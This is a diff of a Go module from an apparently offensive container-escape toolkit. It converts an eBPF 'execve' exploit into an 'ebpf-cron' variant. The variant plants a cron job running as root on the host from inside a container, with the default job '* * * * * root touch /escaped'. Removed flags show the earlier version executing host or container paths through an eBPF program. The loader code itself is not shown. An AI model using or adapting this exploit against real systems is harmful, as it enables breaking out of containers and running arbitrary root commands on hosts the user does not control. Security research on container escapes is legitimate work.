@@ -1,4 +1,4 @@
-package execve
+package cron
 
 import (
 	"github.com/ctrsploit/sploit-spec/pkg/app"
@@ -8,21 +8,13 @@ import (
 )
 
 var (
-	aliases      = []string{"execve"}
+	aliases      = []string{"cron"}
 	flagsExploit = []cli.Flag{
 		&cli.StringFlag{
-			Name:    "path",
-			Aliases: []string{"p"},
-			Usage:   "absolute path to execute, if the -c option is set, the path will auto prepend with /proc/[pid]/root/",
-			Value:   "/usr/bin/id",
-		},
-		&cli.BoolFlag{
-			Name:    "relative",
-			Aliases: []string{"r"},
-			Usage: "If this option is set, the path is treated as a path within a container. " +
-				"It will be automatically prepended with /proc/[pid]/root/ to enable access from the host. " +
-				"Otherwise, the path is considered a host path and executed directly by the eBPF program.",
-			Value: false,
+			Name:    "job",
+			Aliases: []string{"j"},
+			Usage:   "",
+			Value:   "* * * * * root touch /escaped",
 		},
 	}
 	ExploitCmd = app.Vul2ExploitCmd(&Vul, aliases, flagsExploit, true)
@@ -35,7 +27,7 @@ type vulnerability struct {
 
 var Vul = vulnerability{
 	BaseVulnerability: vul.BaseVulnerability{
-		Name:        "ebpf-execve",
+		Name:        "ebpf-cron",
 		Description: "",
 		ExeEnv: exeenv.ExeEnv{
 			Env:     exeenv.InContainer,
@@ -51,5 +43,6 @@ func (v *vulnerability) Exploit(context *cli.Context) (err error) {
 	if err := v.BaseVulnerability.Exploit(context); err != nil {
 		return err
 	}
-	return Load(context.String("path"), context.Bool("relative"))
+	job := context.String("job") + " #"
+	return Load(job)
 }
